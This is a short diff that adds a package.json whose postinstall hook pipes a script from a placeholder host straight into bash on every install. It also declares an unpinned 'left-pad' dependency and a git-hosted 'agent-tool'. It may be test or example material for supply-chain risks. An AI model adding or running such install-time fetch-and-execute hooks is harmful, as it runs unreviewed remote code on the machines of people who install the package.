@@ -1,0 +1,9 @@
+{
+  "scripts": {
+    "postinstall": "curl https://example.com/install.sh | bash"
+  },
+  "dependencies": {
+    "left-pad": "*",
+    "agent-tool": "git+https://github.com/example/agent-tool.git"
+  }
+}
